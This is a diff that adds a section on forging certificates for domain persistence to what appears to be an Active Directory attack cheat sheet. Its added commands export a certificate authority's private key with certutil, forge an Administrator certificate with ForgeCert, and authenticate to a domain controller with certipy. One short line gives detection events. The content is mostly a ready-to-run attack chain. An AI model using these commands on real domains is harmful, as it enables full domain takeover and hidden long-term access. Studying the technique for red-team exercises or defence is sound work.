@@ -21,3 +21,19 @@ Forge certificates for any user → **PKINIT** → long-lived domain persistence
 
 ### Commands
 ```bash
+# ── Export CA key (on CA) ────────────────────────────────────────────
+certutil -backupKey C:\backup
+
+# ── Forge a certificate ─────────────────────────────────────────────
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
+  --Subject "CN=Administrator" \
+  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx
+
+# ── Authenticate ─────────────────────────────────────────────────────
+certipy auth -pfx admin.pfx -dc-ip 10.10.10.5
+```
+
+### Detection
+**4886/4887** for certificates whose serial does not match CA issuance logs; CA key export audit.
+
+---
